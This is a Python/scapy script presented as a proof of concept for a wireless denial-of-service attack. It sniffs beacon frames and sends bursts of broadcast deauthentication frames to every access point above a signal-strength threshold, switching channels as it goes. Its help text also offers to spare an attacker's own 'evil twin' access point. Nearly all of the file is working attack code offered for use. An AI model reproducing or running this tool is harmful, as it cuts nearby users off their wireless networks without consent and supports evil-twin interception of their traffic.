####Proof of concept script for Denial of Servicing wireless access points####
####This script will sniff Beacon frames and filter through them to decide whether to deauth them or not####
####Channel hopping and command line options will come soon####

#!/usr/bin/python2.7
#import sys
#sys.path.insert(0,"/home/matt/programming/python/modules/airodump-iv/airoiv")
#import scapy_ex
from scapy.all import * #Import scapy
import getopt
import random
import os
#######################
#Global variables, these are default values
AP = [] #List to store previously stored access point bssids
channel_list = ["1","2", "3", "4", "5", "6", "7", "8", "9", "10", "11"] #List of channels to switch between
list_length = 5 #How many APs to deauth before switching channels
interface = "mon0" #Default interface to sniff and send packets on
packets = 1000 #Number of packets to be sent per AP
access_point = "" #Access point to skip if found
strength = "-75" #Signal strength of Access point
#######################

def usage(): #Help menu will be printed if the program is called without any 
	print "Tool that measures strength of Acess point signal and will specify targets use it."
	print "-h: prints this menu"
	print "-i: interface to listen and inject packets on (default is mon0)"
	print "-p: Number of packets per access point (default is 1000)"
	print "-a: Use this option to specify the MAC address of an AP you do not want to deauth (such as an evil twin)"
	print "-s: Specify the signal strength for the APs you want to deauth (default is -60)"
	print "> -50dBm is a strong signal, -50dBm to -60dBm is good, -70 dBm is low, -80dBm or less is very weak."
	print "-C: Client to Deauthenticate (default is FF:FF:FF:FF:FF:FF)"
	print "-c: Channels to switch between. (Default setting is channels 1-11)"
	exit(0)


class packet_handler: #Packet handler class

	def __init__(self, pkt): #Class constructor that is called by the sniff function in main
    		try:
    			global interface
    			global packets
    			global access_point
    			global strength
    			global list_length
    			self.interface = interface
    			self.packets = packets
    			self.access_point = access_point
    			self.strength = strength
    			self.list_length = list_length
    			self.packet_parser(pkt) #Call the packet_parser function to start.
		except:
			pass
	def __str__(self):
		return ""


	def send_frame(self, essid, bssid):
		try:
			print "Deauthentication packet sent to %s on Access point %s : ESSID %s" % ("FF:FF:FF:FF:FF:FF", bssid, essid)
			packet = RadioTap()/ Dot11(addr1 = "FF:FF:FF:FF:FF:FF", addr2 = bssid, addr3 = bssid)/ Dot11Deauth() #Constructing the deauth packet.
			sendp(packet, iface = self.interface, count = int(self.packets), inter = 0) #Send deauthentication frames via layer 2.
		except KeyboardInterrupt:
			exit(0)

	def packet_filter(self, essid, bssid, sig_str): #Second function to be used
		if len(AP) > 1: #Check if the AP has more than five entries.
			print "list too long" 
			AP[:] = [] #If list has more than five entries flush it.
			channel = random.choice(channel_list)
			os.system("iwconfig %s channel %s" % (interface, channel))
			print "Channel switch to %s" % (channel)
		if sig_str > int(self.strength) and bssid not in AP and bssid != access_point: #Check if bssid is in previosuly used list and if the singal strength is strong enough(specifying list length and signal strength will be in CLI options later)
			AP.append(bssid) #Add bssid to AP list
			self.send_frame(essid, bssid) #Call the send_frame function to start deauth.

	def packet_parser(self, pkt): #First function to be used in the class.
		essid = pkt.getlayer(Dot11Elt).info #Identify the essid of the packet
		bssid = pkt.getlayer(Dot11).addr2 #Identify the bssid of the packet
		sig_str = -(256-ord(pkt.notdecoded[-4:-3]))#Identify the signal strength of the packet
		self.packet_filter(essid, bssid, sig_str)#Call the packet_filter function and passing the three new variables
def main():
	global interface
	global packets
	global access_point
	global strength
	global client
	global list_length
	try:
		opts, args = getopt.getopt(sys.argv[1:], "h:i:p:a:s:c::n:z", ["help", "interface", "packets", "access_point", "signal_strength", "channel_list", "list_length", "null"]) #set command line arugments

	except getopt.GetoptError as err: #if there is an error print the error then the usage function
		print str(err)
		usage()
	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
			break
		elif o in ("-i"):
			interface = a
		elif o in ("-p"):
			packets = int(a)
		elif o in ("-a"):
			access_point = a
		elif o in ("-s"):
			strength = a 
		elif o in ("-c"):
			channel_list[:] = []
			b = a.split(",")
			for i in b:
				channel_list.append(i)
			channel = channel_list[0]
			print channel
			
			#os.system("iwconfig %s channel %s") % (interface, channel)
			#print "Channel switch to channel %s" % (channel)
		elif o in ("n"):
			list_length = int(a)

	sniff(prn = packet_handler, lfilter = lambda x: x.haslayer(Dot11Beacon), iface = interface, store = 0) #Sniff packets from the air, filtering them by Beacon frames and passing them to the packet_handler class.

if __name__ == '__main__':
	main()
